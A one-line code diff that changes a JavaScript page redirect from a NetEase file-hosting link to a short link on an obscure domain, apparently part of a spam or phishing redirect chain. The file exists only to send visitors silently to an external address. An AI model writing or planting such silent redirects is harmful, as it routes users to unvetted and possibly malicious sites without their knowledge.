@@ -1,1 +1,1 @@
-window.location.href='https://nim-nosdn.netease.im/MjYxNDkzNzE=/bmltYV8yMDQ1MzQ5NTc0MzBfMTcwMDU3MDIyNTk0NF82ZGUyNzMyOS0yZTcxLTRlYmUtYTQ2OC1iZDhmMTliNzY3ZmM=?id=raHtTnV19ovLyXkb0sCjmfSJ3zEhPNR7'
+window.location.href='http://t.gszjzhgdjgpt.com/zT4Gk'
